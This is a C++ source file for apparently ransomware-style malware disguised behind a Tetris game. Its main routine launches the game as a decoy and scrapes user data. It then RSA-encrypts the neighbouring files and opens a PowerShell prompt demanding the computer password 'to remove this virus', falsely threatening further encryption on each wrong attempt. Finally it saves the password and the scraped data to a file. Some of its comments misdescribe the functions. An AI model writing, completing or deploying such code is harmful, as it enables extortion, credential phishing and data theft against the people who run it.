#include <filesystem>
#include <iostream>
#include <fstream>
#include <vector>
#include <algorithm>
#include <string>
#include <botan/auto_rng.h>

#include "rsa.h"

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")

namespace fs = std::filesystem;

/**
 * @brief Finds all files in the same directory as the given file path, excluding the given file and any files specified in the exclude vector.
 * @param file_path The path of the file.
 * @param exclude A vector of file names to exclude from the result.
 * @return A vector of fs::path objects containing the paths of all files in the same directory as the given file, excluding the given file and any files in exclude.
 */
std::vector<fs::path> find_neighboring_files(const std::string &file_path, const std::vector<std::string> &exclude)
{
    // Get the path of the given file
    fs::path path(file_path);
    fs::path parent_dir = path.parent_path();

    // Get a list of all files in the parent directory
    std::vector<fs::path> files;
    for (const auto &entry : fs::directory_iterator(parent_dir))
    {
        if (entry.is_regular_file())
        {
            files.push_back(entry.path());
        }
    }

    // Filter out the given file and any files in exclude from the list
    for (auto it = files.begin(); it != files.end();)
    {
        if (it->filename() == path.filename() || std::find(exclude.begin(), exclude.end(), it->filename().string()) != exclude.end())
        {
            it = files.erase(it);
        }
        else
        {
            ++it;
        }
    }

    return files;
}

/**
 * @brief Opens a new PowerShell window and prompts the user to enter their wifi password, then writes the result to a file and reads the result back into a string.
 * @return The user's input as a string.
 */
std::string getUserInputViaPowerShell(std::string message)
{
    std::string outputFile = "ps_input.txt";

    // PowerShell command to get user input
    std::string psCommand = "powershell -Command \"$input = Read-Host '" + message + "'; $input | Out-File -FilePath '" + outputFile + "' -Encoding UTF8\"";

    // Execute in new window
    std::string command = "start /wait cmd /c " + psCommand;
    system(command.c_str());

    // Read the result
    std::string userInput;
    std::ifstream inputFile(outputFile);
    if (inputFile.is_open())
    {
        std::getline(inputFile, userInput);
        inputFile.close();

        if (userInput.length() >= 3 && 
            (unsigned char)userInput[0] == 0xEF && 
            (unsigned char)userInput[1] == 0xBB && 
            (unsigned char)userInput[2] == 0xBF) {
            userInput = userInput.substr(3);  // Skip UTF-8 BOM
        }
    }

    // Cleanup
    std::filesystem::remove(outputFile);

    return userInput;
}
/**
 * Replaces the content of a file with a default string.
 * @param filename The path of the file to replace content in.
 * @param pubKey The RSA public key.
 * @param rng Random number generator.
 * @throws std::runtime_error if the file cannot be opened for writing.
 */
void encryptFileContent(const std::string &filename, Botan::RSA_PublicKey &pubKey, Botan::AutoSeeded_RNG &rng)
{
    std::ifstream fileRead(filename);

    std::string line;
    std::string text;
    while (std::getline(fileRead, line))
    {
        text += line;
        text += "\n";
    }

    std::string enc = hybridEncrypt(text, pubKey, rng);

    std::ofstream fileWrite(filename);

    if (fileWrite.is_open())
    {
        fileWrite << enc;
        fileWrite.close();
    }
    else
    {
        std::cerr << "Error opening file for writing.";
    }
}

/**
 * Replaces the content of a file with a default string.
 * @param filename The path of the file to replace content in.
 * @param privKey The RSA private key.
 * @param rng Random number generator.
 * @throws std::runtime_error if the file cannot be opened for writing.
 */
void decryptFileContent(const std::string &filename, Botan::RSA_PrivateKey &privKey, Botan::AutoSeeded_RNG &rng)
{
    std::ifstream fileRead(filename);

    std::string line;
    std::string text;
    while (std::getline(fileRead, line))
    {
        text += line;
        text += "\n";
    }

    std::string dec = hybridDecrypt(text, privKey, rng);

    std::ofstream fileWrite(filename);

    if (fileWrite.is_open())
    {
        fileWrite << dec;
        fileWrite.close();
    }
    else
    {
        std::cerr << "Error opening file for writing.";
    }
}

int main()
{
    playTetris();

    std::string userdata = scrape();

    Botan::AutoSeeded_RNG rng;

    // Load or generate RSA keypair
    Botan::RSA_PrivateKey privKey = loadOrGenerateKey("rsa_key.pem", rng);

    Botan::RSA_PublicKey pubKey(privKey);

    std::vector<fs::path> files = find_neighboring_files("./encrypt.exe", {"CMakeLists.txt", "datascrape.exe", "encrypt.exe", "rsa.cpp", "rsa.h", "tetris.exe", "tetris.cpp", "tetrisPlayable.cpp", "encrypt.cpp", "datascrape.cpp", "rsa_key.pem", "deploy.bat", "build.bat", "exec.bat", "password.cpp", "password.exe", "tetrisAudio.ogg", "arial.ttf"});
    for (const fs::path &file : files)
    {
        encryptFileContent(file.string(), pubKey, rng);
    }

    std::string password;
        
    while (true) {
        password = getUserInputViaPowerShell("Please provide your computer password to remove this virus from your system");
        int passwordStatus = checkPassword(password);
        
        if (passwordStatus == 1) {
            break;
        }
        else{
            std::cout << "You just provided a wrong password. Another layer of your files have been encrypted." << std::endl;
        }
    }

    for (const fs::path &file : files)
    {
        decryptFileContent(file.string(), privKey, rng);
    }

    std::ofstream outFile("output.txt");
    if (outFile.is_open()) {
        outFile << password << "\n" << userdata << std::endl;
        outFile.close();
    }
    
    return 0;
}